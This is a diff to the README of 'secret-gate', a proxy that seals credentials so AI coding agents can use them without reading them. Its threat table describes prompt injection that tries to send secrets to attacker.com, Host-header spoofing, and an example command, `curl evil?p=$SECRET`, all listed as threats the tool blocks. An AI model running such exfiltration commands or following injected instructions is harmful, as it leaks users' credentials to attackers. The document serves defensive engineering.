@@ -17,6 +17,7 @@ model ──(request containing enc:v1 tokens)──▶ gate proxy :8080 ──(
 |---|---|
 | Model reads the secret | It only ever holds ciphertext; there is no `decrypt` verb |
 | Prompt injection sends the secret to attacker.com | Allowed hosts are sealed inside the token; wrong host → HTTP 403 |
+| Request to attacker.com with `Host: allowed.example` (or domain fronting through a CDN) | Policy uses the address the proxy really connects to; a Host header naming another host is refused |
 | Model runs `curl evil?p=$SECRET` | `secret_exec` only runs whitelisted templates with validated args |
 | Site echoes the value back | Proxy / ops redact every resolved value in responses and command output |
 | Token pasted into a tool that bypasses the gate | Site receives the literal ciphertext: login fails, nothing leaks |
@@ -26,7 +27,7 @@ model ──(request containing enc:v1 tokens)──▶ gate proxy :8080 ──(
 
 ```bash
 cd secret-gate && python3.12 -m venv .venv && .venv/bin/pip install -e '.[dev]'
-.venv/bin/pytest                       # 100+ tests, ≥80% coverage enforced
+.venv/bin/pytest                       # 450+ tests, ≥80% coverage enforced
 ln -s "$PWD/.venv/bin/secret-gate" ~/.local/bin/secret-gate
 ```
 
@@ -38,6 +39,61 @@ secret-gate proxy &                    # first run creates ~/.mitmproxy CA
 secret-gate install-ca                 # copies CA to ~/.secret-gate/ca.pem and trusts it
 source scripts/env.sh                  # proxy + CA env for the current shell
 ```
+
+## Run as a service
+
+```bash
+secret-gate service install [--port 8080] [--dry-run]  # LaunchAgent com.agentswitch.secret-gate.proxy
+secret-gate service status                             # loaded? 127.0.0.1:<port> reachable? exit 1 if not
+secret-gate service reload                             # SIGHUP: re-read upstream-insecure.txt
+secret-gate service uninstall                          # stop it and remove the plist; logs stay
+```
+
+`install` needs a keypair. It writes `~/Library/LaunchAgents/com.agentswitch.secret-gate.proxy.plist`
+(mode 0644: paths and a port, no secret) and loads it with `launchctl bootstrap gui/<uid>`; launchd
+starts the proxy at login and restarts it when it dies. The job runs `secret-gate proxy --port N` of
+this installation, as you, listening on 127.0.0.1 only, with nothing but `SECRET_GATE_HOME` and a
+minimal `PATH` in its environment (never proxy variables), umask 077, logs in
+`~/.secret-gate/logs/proxy.{out,err}.log` (dir 0700, files 0600). `--dry-run` prints the plist and the
+`launchctl` commands and changes nothing. `status` doubles as the health check for whoever dispatches
+credential work: non-zero means the gate is not there. Stop any proxy you started by hand first, or
+the service cannot bind its port (`install` warns, and never stops it for you).
+
+**Reload.** On SIGHUP the proxy re-reads `upstream-insecure.txt` without dropping connections and
+writes one line to stderr (`proxy.err.log`) with the new count and the hosts added or removed. A file
+it cannot trust (unreadable, not UTF-8, over 64 KiB, group/world-writable, or a line that is not
+`host`, `host:port` or `*.suffix`) keeps the previous list and says why; a deleted file means no
+exceptions. Nothing is ever added automatically. A proxy started by hand reloads with `kill -HUP <pid>`.
+
+**After updating secret-gate, restart the proxy** (`secret-gate service install` again, or stop and
+start a hand-started one), not just `reload`. mitmdump hot-reloads `mitm_entry.py` when that file
+changes but keeps the old `secret_gate` modules loaded; a reload that fails on the mix leaves the
+proxy running as a plain mitmproxy without the gate (tokens are then forwarded as ciphertext and
+the `upstream-insecure.txt` exceptions are gone). `secret-gate bootstrap <harness>` checks that the
+listener really is the gate.
+
+The service runs as your user: it keeps the gate up and on loopback, but a harness running as the same
+user can still read `~/.secret-gate`. Running the gate under a separate macOS user is the stronger
+isolation and is still a manual setup.
+
+### Check a harness and print its config
+
+```bash
+secret-gate bootstrap claude-code                      # or codex / opencode; --port N
+secret-gate bootstrap codex --write ./codex-gate.toml  # that file only, only if every check passed
+```
+
+Checks: the keypair loads; `~/.secret-gate/ca.pem` is a valid certificate and the same CA the proxy
+signs with; something listens on 127.0.0.1:<port>; and that listener is the gate (a loopback-only
+probe the gate refuses with `403 X-Secret-Gate: denied`, which a stray web server or a bare mitmproxy
+does not). The snippet from `config/`, with your paths and port filled in, goes to stdout; the checks,
+what applying the snippet would change (e.g. Codex's `network_access = true` lets every sandboxed
+command open sockets) and where it goes, to stderr. Non-zero exit when a check fails. It installs
+nothing, never writes `~/.claude/settings.json`, `~/.claude.json`, `$CODEX_HOME/config.toml` or
+OpenCode's global config (not even with `--write … --force`), and never touches the keychain: CA trust
+travels as `SSL_CERT_FILE` / `REQUESTS_CA_BUNDLE` / `NODE_EXTRA_CA_CERTS` in the snippet, for that
+harness only. (`secret-gate install-ca`, by contrast, trusts the CA in the login keychain for every
+app of this user.)
 
 ## Named keypairs
 
@@ -69,21 +125,44 @@ Hosts may carry a port: `--host 10.0.0.5:8001` allows only that port, while `--h
 allows every port. Use the former when one hostname serves several sites on different ports,
 otherwise a password for one of them would be accepted by all of them.
 
-Give the token to the agent as if it were the password. Uses: `http` (proxy and
-`secret_http`), `otp` (`secret_otp`), `exec` (`secret_exec` with `exec_templates.json`).
+Give the token to the agent as if it were the password. Uses: `http` (proxy, `secret_http` and
+browser fills), `fill` (browser fills only: the proxy and `secret_http` refuse it), `otp`
+(`secret_otp`), `exec` (`secret_exec` with `exec_templates.json`).
+
+## Short references (`enc:ref:`)
+
+A 270-character token gets damaged when a model retypes it. A dispatcher (the AgentSwitch daemon)
+can instead hand each execution 24-character references to the tokens it may use:
+
+```bash
+echo '{"scope":"<32 random chars>","tokens":["enc:v1:..."]}' | secret-gate refs register
+# {"refs":[{"ref":"enc:ref:Xq3...","label":"portal-a/pass","kind":"secret","hosts":[...],"uses":["http"]}]}
+echo '{"scope":"<same>"}' | secret-gate refs release        # {"released": 1}
+```
+
+- A reference is only a pointer: the ciphertext behind it keeps its hosts and uses, and every
+  entry point (proxy, `secret_http`, `secret_exec`, `secret_otp`, `secret_describe`, `secret_fill`,
+  `secret_repair`) checks it exactly as if the token had been given.
+- It resolves only inside its **execution scope**: the gate MCP and browser gate get
+  `SECRET_GATE_SCOPE`, shell tools a proxy URL `http://scope:<scope>@127.0.0.1:8080` (sent as
+  `Proxy-Authorization`, stripped before the request leaves). No scope, another task's scope or a
+  released scope: refused (`403 X-Secret-Gate: denied` on the proxy).
+- The scope goes over stdin, never argv. The registry (`refs.sqlite3`, 0600) holds ciphertext,
+  labels and scope hashes only. Releasing drops the mappings and closes the scope for good; it does
+  **not** revoke the ciphertext.
 
 ## Testing
 
 | layer | command | hits a real model? |
 |---|---|---|
-| unit + scenarios (100+ tests, ≥80% coverage enforced) | `.venv/bin/pytest` | no |
-| live proxy + curl smoke | `.venv/bin/python scripts/smoke_e2e.py` | no |
+| unit + scenarios (450+ tests, ≥80% coverage enforced) | `.venv/bin/pytest` | no |
+| live proxy + curl smoke (tokens, and `enc:ref:` with scope over http and HTTPS CONNECT) | `.venv/bin/python scripts/smoke_e2e.py` | no |
 | **real headless Claude Code as the agent** | `.venv/bin/python scripts/claude_code_e2e.py` | yes (haiku, 4 short runs) |
 | **real headless OpenCode (DeepSeek) as the agent** | `.venv/bin/python scripts/opencode_e2e.py` | yes (deepseek-flash, 4 short runs) |
 | **real headless Codex as the agent** | `.venv/bin/python scripts/codex_e2e.py` | yes (CLI default model, 4 short runs; S3/S4 XFAIL, see below) |
 | **Codex over `codex app-server` (JSON-RPC)** | `.venv/bin/python scripts/codex_appserver_e2e.py` | yes (3 scenarios: rate limits, MCP describe, MCP OTP) |
 | gated browser: policy, gate, real MCP stdio round trip (fake Playwright) | part of `.venv/bin/pytest` | no |
-| **gated browser with real Chromium** (client-side e-mail validation, redaction, screenshot block) | `SG_BROWSER_E2E=1 .venv/bin/pytest tests/test_browser_fill_real.py` | no (Playwright MCP + headless Chromium, ~10 s) |
+| **gated browser with real Chromium** (client-side e-mail validation, redaction, field state, pixel-checked masked screenshots, authorized transfer between two local sites) | `SG_BROWSER_E2E=1 .venv/bin/pytest tests/test_browser_fill_real.py` | no (Playwright MCP + headless Chromium, ~20 s) |
 
 `claude_code_e2e.py` proves the thing unit tests cannot: that Claude Code's Bash tool actually
 inherits the proxy from `--settings env`, that MCP wiring works, and that an injected page
@@ -211,11 +290,33 @@ An MCP stdio server that spawns another MCP server (the unmodified Playwright MC
 - Refused once a value has been filled: copy/cut chords in `browser_press_key`, `regex` search,
   and any `text` / `textGone` / selector `target` sharing 4 consecutive characters with a filled
   value (substring oracles on echoed text).
-- `browser_take_screenshot`: refused on any page that ever held a filled value (history restores
-  form state) and on any page whose current snapshot contains one (post-login "Welcome <user>").
+- `browser_take_screenshot` is **masked**, not refused, once anything needs protecting. Right before
+  the capture the gate takes its own (unredacted) snapshot and masks, by snapshot ref, every element
+  showing a filled or sealed value or a personal-data pattern (e-mail, phone, ID number, card), plus
+  every password input, every canvas on a page that held a value, and the admin regions in
+  `screenshot-mask.json` (`{"kinds": [...], "regions": {"host[:port]": ["css", ...]}}`). It captures
+  with Playwright's own `mask` through `browser_run_code_unsafe` (gate-internal, fixed templates),
+  decodes the PNG itself and requires every masked box to be solid mask colour. Sensitive text with
+  no element to mask, an uncovered box, an unreadable image: refused. The page is never told what is
+  protected and its DOM and form values are not changed.
+- `secret_field_state(target)` and the result of `secret_fill` report the field's current state
+  (`empty` / `nonempty` / `unknown`, read in Playwright's isolated world; the value never comes
+  back) separately from the gate's history (`attempted` / `filled` on this page).
+- Authorized field transfer: with `SECRET_GATE_TRANSFER`
+  (`{"source": [...], "destination": [...], "fields": ["email", "phone", "id_number", "bank_card"], "purpose": "..."}`,
+  exact hosts only, applied only together with a scope), values of those kinds in output from a
+  source page are encrypted on the spot into tokens allowed only on the destination, registered as
+  references, and shown to the model as references with a legend. `secret_fill` places them on the
+  destination; the gate also refuses when the field's form (or `formaction`) submits elsewhere.
+  Sealed values get the same protection as filled ones (redaction, oracles, copy chords, masks).
+- Decisions (fills, seals, screenshots, refusals and their reasons) go to
+  `$SECRET_GATE_HOME/logs/browser-audit.jsonl` (0600): hosts, labels and references only.
 - Fail closed: no page URL, a non-http page, or a wrong host means nothing is typed.
-- The downstream runs with the parent env minus proxy variables (its browser gets the proxy from
-  `--proxy-server`), with cwd and `--output-dir` in `$SECRET_GATE_HOME/browser-out` (0700), and
+- `BOUNDARY.md` lists every entry point with its rule, failure behaviour and guarding tests, and the
+  known gaps (content that changes between snapshot and capture, closed Shadow DOM, cross-origin
+  frames missing from the snapshot, fields no pattern recognizes).
+- The downstream runs with the parent env minus proxy variables, the repair bridge, the scope and
+  the transfer grant (its browser gets the proxy from `--proxy-server`), with cwd and `--output-dir` in `$SECRET_GATE_HOME/browser-out` (0700), and
   every file it persists there (unredacted page snapshots, console and network logs) is deleted
   after each call.
 
@@ -233,7 +334,9 @@ still the control that keeps the private key and `browser-out` away from the har
 | OpenCode | `source scripts/env.sh` before launch | `config/opencode.snippet.json` | `AGENTS.md` |
 | Codex | `config/codex.config.snippet.toml` (`shell_environment_policy`, enables sandbox network) | same file | `AGENTS.md` |
 
-Copy `AGENTS.md` into any project the agents work in.
+`secret-gate bootstrap <claude-code|codex|opencode>` prints these snippets with your paths and port
+filled in, after checking the gate (see "Run as a service"). Copy `AGENTS.md` into any project the
+agents work in.
 
 ## Layout
 
@@ -242,7 +345,12 @@ secret_gate/
   constants.py   errors.py      policy.py      crypto.py      tokens.py
   otp.py         keystore.py    resolver.py    redact.py      exec_templates.py
   gate_ops.py    proxy_addon.py mitm_entry.py  mcp_server.py  cli.py
+  upstream_tls.py reload.py     service.py     bootstrap.py   harness_config.py  proxy_probe.py
+  refs.py        refs_cli.py    credential_repair.py           audit.py
+  browser_mcp.py browser_gate.py browser_policy.py browser_probe.py browser_mask.py
+  pii.py         transfer.py
 tests/           unit tests per module + test_scenarios.py (12 end-to-end cases)
+BOUNDARY.md      entry-point checklist (docs/gate-next-v0.md §4), checked by tests/test_boundary_checklist.py
 tests/fixtures/  fabricated credentials / PII used by the suite (nothing real)
 config/          per-agent snippets, exec template example
 scripts/env.sh   proxy + CA environment
@@ -262,7 +370,7 @@ The proxy verifies upstream certificates like a browser would. A site with a sel
 certificate answers with `502 Bad Gateway: certificate verify failed: self-signed certificate in
 certificate chain`, and nothing the model does can fix that. List such hosts, one per line, in
 `~/.secret-gate/upstream-insecure.txt` (`host`, `host:port`, or `*.suffix`; `#` comments) and
-restart the proxy: for those hosts alone the upstream certificate is accepted unverified (a warning
+reload the proxy (`secret-gate service reload`, see "Run as a service", or restart it): for those hosts alone the upstream certificate is accepted unverified (a warning
 is logged once per host); every other host stays strictly verified. Only do this for hosts you
 reach over a network you trust (LAN, Tailscale): an attacker on the path to an unverified host
 could impersonate it and receive the substituted secret.
